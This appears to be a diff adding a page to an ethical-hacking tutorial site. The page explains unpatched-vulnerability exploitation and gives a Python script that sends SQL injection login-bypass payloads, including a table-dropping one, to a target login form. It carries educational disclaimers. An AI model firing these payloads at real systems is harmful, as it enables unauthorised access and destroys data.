@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>PEN-TEST | ADRIAN</title>
+  <link rel="stylesheet" href="../style.css" type="text/css" media="all" />
+</head>
+<body>
+
+  <div class="main-header">
+    <h1>CyberSHESH</h1>
+  </div>
+
+  <div class="main-home">
+    <h1>ETHICAL HACKING | PENETRATION TESTING</h1>
+    <hr />
+    <p>By: Adrian Martin</p>
+  </div>
+
+  <br />
+
+  <div class="main-NDM">
+    <h1>Exploiting Unpatched Vulnerability</h1>
+    <button class="back-btn"><a href="../CSh.html">BACK</a></button>
+  </div>
+
+  <div class="discription-NDM">
+    <h2>What is Exploiting an Unpatched Vulnerability?</h2>
+    <h2>This technique involves identifying and targeting known security flaws in software or web applications that have not yet been patched by the system administrator. Attackers can use these vulnerabilities to gain unauthorized access, extract sensitive data, or compromise an entire system.</h2>
+    <br />
+    <h2>Why is it Important in Ethical Hacking and Penetration Testing?</h2>
+    <h2>Penetration testers simulate exploitation of unpatched vulnerabilities to:</h2>
+
+    <ul class="full-list">
+      <li>Assess whether patch management processes are effective.</li>
+      <li>Discover neglected or outdated software versions.</li>
+      <li>Demonstrate the impact of public exploits in real-world scenarios.</li>
+      <li>Encourage prompt updates and secure configurations.</li>
+    </ul>
+
+    <h2>Ethical exploitation helps organizations prioritize critical patches, minimize exposure, and enforce timely vulnerability management practices.</h2>
+
+    <h2>Python Code: exploiting_unpatched_vulnerability.py</h2>
+    <div class="box-code">
+<pre><code>
+import requests
+import sys
+
+payloads = [
+"' OR '1'='1",
+"' OR 1=1 --",
+"' OR 'a'='a",
+"'; DROP TABLE users; --",
+"' OR 'x'='x' /*",
+"\" OR \"\"=\"",
+]
+
+headers = {
+"User-Agent": "Mozilla/5.0 (SQLi Scanner)"
+}
+
+def test_sqli(url, username_field, password_field):
+print(f"\n[!] Testing SQLi on: {url}\n")
+for payload in payloads:
+data = {
+username_field: payload,
+password_field: payload
+}
+try:
+response = requests.post(url, data=data, headers=headers, timeout=5)
+print(f"[*] Payload: {payload} => Status: {response.status_code}")
+if "Welcome" in response.text or "Dashboard" in response.text:
+print(f"[+] Possible vulnerability detected with payload: {payload}")
+return
+except Exception as e:
+print(f"[-] Request failed: {e}")
+print("[!] Testing complete. No obvious vulnerability found.")
+
+if __name__ == "__main__":
+target = input("Enter target login URL: ")
+user_field = input("Enter username field name (e.g., 'username'): ")
+pass_field = input("Enter password field name (e.g., 'password'): ")
+test_sqli(target, user_field, pass_field)
+</code></pre>
+    </div>
+    <button class="downloadBTN"><a href="../SCRIPT/EUV.py">DOWNLOAD CODE</a></button>
+    <br />
+    <h2>Disclaimer:</h2>
+    <p>This guide and any related scripts are for educational and authorized penetration testing only. Unauthorized exploitation of vulnerabilities is illegal and unethical. Always conduct security testing with explicit permission.</p>
+  </div>
+
+  <footer style="background-color: #111; padding: 20px; text-align: center; color: #fff; border-top: 2px solid red;">
+    <h2 style="color: red; margin-bottom: 10px;">For Educational Purpose Only!</h2>
+    <p>This website is built strictly for cybersecurity awareness and ethical hacking education.</p>
+    <p style="color: orange; font-weight: bold;">This page contains security features. Activities are being monitored.</p>
+    <p>Use at your own risk. Unauthorized testing on live systems is illegal.</p>
+    <p><a href="../privacy/privacy.html" style="color: red; text-decoration: underline;">Privacy & Legal Rights</a></p>
+    <br />
+    <p style="color: gray;">© 2025 CyberSHESH | Developed by Adrian Martin</p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script src="../js/pycode.js"></script>
+</body>
+</html>
